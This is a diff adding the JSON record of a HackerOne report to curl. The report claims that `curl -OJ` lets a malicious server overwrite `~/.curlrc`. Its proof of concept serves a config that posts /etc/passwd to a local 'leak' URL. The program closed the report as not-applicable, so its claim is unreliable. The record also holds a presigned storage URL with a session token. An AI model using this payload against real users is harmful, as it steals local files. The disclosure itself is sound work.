@@ -1,0 +1,202 @@
+{
+  "id": 3427194,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNDI3MTk0",
+  "url": "https://hackerone.com/reports/3427194",
+  "title": "Malicious server forces .curlrc creation via curl -OJ leading to local file exfiltration",
+  "state": "Closed",
+  "substate": "not-applicable",
+  "readable_substate": "N/A",
+  "created_at": "2025-11-15T15:47:01.004Z",
+  "submitted_at": "2025-11-15T15:47:01.145Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "djogho",
+    "url": "/djogho",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/94yltqw1noc080f62l8pcm68fmzj/47c72a82657a929c13ab24e11674f7e10ea2bf67b1b9e7116b522cd7ede42f15"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": true,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2025-11-15T22:32:51.135Z",
+  "bug_reporter_agreed_on_going_public_at": "2025-11-15T22:32:50.957Z",
+  "team_member_agreed_on_going_public_at": "2025-11-15T22:10:25.373Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nWhen a user runs `curl -OJ <url>`, a malicious server can force the response to be saved as `.curlrc` in the working directory. If the user executes the download from their home directory (a common workflow), the attacker overwrites `~/.curlrc`. Subsequent `curl` invocations automatically load this configuration file before processing command-line arguments, allowing the attacker to silently exfiltrate local files or proxy future requests.\n\nUsed AI to refine the text\n\n## Affected version\n```bash\ndjamelghorab@DESKTOP-VUFM4GM:~$ curl -V\ncurl 8.5.0 (x86_64-pc-linux-gnu) libcurl/8.5.0 OpenSSL/3.0.13 zlib/1.3 brotli/1.1.0 zstd/1.5.5 libidn2/2.3.7 libpsl/0.21.2 (+libidn2/2.3.7) libssh/0.10.6/openssl/zlib nghttp2/1.59.0 librtmp/2.3 OpenLDAP/2.6.7\nRelease-Date: 2023-12-06, security patched: 8.5.0-2ubuntu10.6\nProtocols: dict file ftp ftps gopher gophers http https imap imaps ldap ldaps mqtt pop3 pop3s rtmp rtsp scp sftp smb smbs smtp smtps telnet tftp\nFeatures: alt-svc AsynchDNS brotli GSS-API HSTS HTTP2 HTTPS-proxy IDN IPv6 Kerberos Largefile libz NTLM PSL SPNEGO SSL threadsafe TLS-SRP UnixSockets zstd\n```\n\n## Steps To Reproduce:\n1. Start a listener that serves a malicious payload:\n```sh\ncat <<'EOF' | ncat -l 8000 --keep-open\nHTTP/1.1 200 OK\nContent-Length: 63\nContent-Disposition: attachment; filename=\".curlrc\"\n\nurl = \"http://127.0.0.1:8000/leak\"\ndata = \"@/etc/passwd\"\nEOF\n```\n2. From the target's home directory, download the file with `curl -OJ http://127.0.0.1:8000/pwn`. The transfer creates `~/.curlrc` populated with the attacker's directives.\n3. The next time the victim runs a routine command such as `curl https://example.com`, the tool processes the injected configuration first and silently exfiltrates `/etc/passwd` to `http://127.0.0.1:8000/leak` before issuing the user-requested transfer.\n\n## Supporting Material/References:\n{F5010008}",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 5010008,
+      "file_name": "curl.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/aaesccobqqdhot4i227tu7x1j6v2?response-content-disposition=attachment%3B%20filename%3D%22curl.png%22%3B%20filename%2A%3DUTF-8%27%27curl.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVRDMHRUF%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T042609Z&X-Amz-Expires=487&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDcaCXVzLXdlc3QtMiJHMEUCIQCkZ620OyLqM9nC4OVOo3VlSjNd4hMhQneg4DNkWeYB5QIgDqVoKq4s3KGlb8%2B5J7YCjpbWAu9dr4U%2FeYWfnwF1oR0quwUI%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDBoFrJaD%2B%2FWre9SMRiqPBfyzxhj6KPYz1vwbQEZBzQPgb9yve929kP78WJy0u3qQ46fBPhKTII1g4gNDttOJzea6c0S%2BoPtSvvaKB77sbWdFpc%2FpcEjiK99YKqTFENkIpfIGXd%2FATv5pQibsSmiYrXsTH%2FZdS0VUqgoCWT9bGlZbpUAhtx%2BPDzU0YlsK1g4IDypfZNjeJNYodbjNfw8yhwECaiJ6stuAnlatWQP%2FfRQe761xNmGezFQlGGcNwxcMXuFjdRbB7jGs8G9Dly3H%2FTkmmUn7hgpy9O33Lf1I3IJbepabDbQaa3xAfXLwxf0DfDeO%2BmtI1qdn%2FEe5DfPs74kPCdT6FYmOXsrq%2FTq4IEbdYSrB56DwFO4EcVYKPgdYlbhvafCSBgqhHprymwQuf3tG6hd9pnoKivL%2FgiWsKuCAINr2eMw0t9fjxxD5So2MAlSxlQC07sQKUEM7pUdFP%2Bh7FKb2MG%2FuwsJ4SV2KSpyDVNL5lr9sRyn1SdTxOvIwdZQRft74OBJpiY3iaZlV8t4dF5bwSAge5bR1lo9fMNT6AoT03cokj%2BMAAuK9WWnMkydWymw8WAnRcPKoN9DAz3%2BJMn81MF1vfr6gY55EAXYLR5V18PL5Vp6n6XBHQdwesu3ixHOkzDmF%2F%2F3C3qszzDlH28jBQQr5ca0c23DBwnr1RgNHOpXe214OSA1f6%2Bv%2BDRJOpKLuiWjIRf0BORrF0aW8fMx6o0pZZ4O%2BaxOARSY4l79s599312ieUFibPWPzgIlhmHVxoA3g0HCf6xB57awibHLgFJzyD39iEq%2Bal4R653myPu3%2BeTH%2F1NViStiwtVTHLWuJk9Y%2BeacbsNldhLXAdJndTCiyFFYlaEoQDw9azxXi027KoBkXPRgX9NIwxMib0gY6sQGh9Z2lmSis%2BKv1CLvr42aytqz1UoxLdI5fnnz%2FvK8sx%2BE%2BI%2FdKhlM49R%2BxOcrfvsTuTC8UlH01t7oNkMgovej08IigHKezK%2BqZXhI1z0pt8pEkejn9kBasmXd343oxIBfuolt0C9sYjYMjKhSQeWruzxGrqTnQ2M1eMAA%2Fdwnew3fVz%2B3cXZXIDDwu6c2d3ka19e0ToR%2FcxVdpwjSXITsi3QtTShzE2Fc7BvSo66jmeGs%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5dd3b3d27b9c744bd00602a880b6d38a6f024efe292f9127e56849e72c66a734",
+      "file_size": 236931,
+      "type": "image/png",
+      "moderated": false
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 8,
+  "voters": [
+    "2026",
+    "ber1in",
+    "djogho",
+    "zeta47",
+    "kamekame",
+    "cellroad4sec",
+    "triloos",
+    "saintvlucifer"
+  ],
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 784246,
+      "category": "researcher",
+      "content": "When a user runs `curl -OJ <url>` or `curl -LO <url>` , a malicious server can force the response to be saved as .curlrc in the working directory. If the user executes the download from their home directory (a common workflow), the attacker overwrites ~/.curlrc. Subsequent curl invocations automatically load this configuration file before processing command-line arguments, allowing the attacker to silently exfiltrate, overwrite local files or execute commands.\n",
+      "updated_at": "2025-11-15T22:34:21.713Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 5038,
+        "username": "djogho",
+        "name": "",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": null,
+        "location": "",
+        "created_at": "2014-04-16T06:07:07.601Z",
+        "url": "https://hackerone.com/djogho",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/94yltqw1noc080f62l8pcm68fmzj/47c72a82657a929c13ab24e11674f7e10ea2bf67b1b9e7116b522cd7ede42f15",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/94yltqw1noc080f62l8pcm68fmzj/8f5393bb06e000811ac3ac31f77f5ce1d049785766c3d25a25cec97adaa9cc12",
+          "xtralarge": "https://hackerone.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6NjA4MDU2NCwicHVyIjoiYmxvYl9pZCJ9fQ==--70eb730013874fa5f2a8ee7b41437c7c3a2bfd6b/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJqcGVnIiwicmVzaXplIjoiMjYweDI2MFx1MDAzZSJ9LCJwdXIiOiJ2YXJpYXRpb24ifX0=--077a116fdc5fd6949baa55fe21d29943970c85dc/2_original.jpeg"
+        }
+      }
+    }
+  ],
+  "databaseId": "3427194",
+  "votes": 8,
+  "latest_disclosable_activity_at": "2025-11-15T22:32:51.333Z",
+  "severity": null,
+  "weakness": null,
+  "_metadata": {
+    "saved_at": "2026-07-03T12:26:09.218603",
+    "source": "https://hackerone.com/reports/3427194.json",
+    "report_id": 3427194
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNDI3MTk0",
+    "databaseId": "3427194",
+    "title": "Malicious server forces .curlrc creation via curl -OJ leading to local file exfiltration",
+    "url": "https://hackerone.com/reports/3427194",
+    "state": null,
+    "substate": "not-applicable",
+    "disclosed_at": "2025-11-15T22:32:51.135Z",
+    "created_at": "2025-11-15T15:47:01.004Z",
+    "submitted_at": null,
+    "weakness": null,
+    "severity": null,
+    "reporter": {
+      "username": "djogho"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzM1NjYz",
+      "handle": "curl",
+      "name": "curl",
+      "url": "https://hackerone.com/curl",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": []
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzM0MjcxOTQ=",
+    "_id": "3427194",
+    "disclosed": true,
+    "votes": 8,
+    "latest_disclosable_activity_at": "2025-11-15T22:32:51.333Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNDI3MTk0",
+      "databaseId": "3427194",
+      "title": "Malicious server forces .curlrc creation via curl -OJ leading to local file exfiltration",
+      "url": "https://hackerone.com/reports/3427194",
+      "disclosed_at": "2025-11-15T22:32:51.135Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzM1NjYz",
+      "handle": "curl",
+      "name": "curl",
+      "url": "https://hackerone.com/curl",
+      "currency": "usd"
+    }
+  }
+}
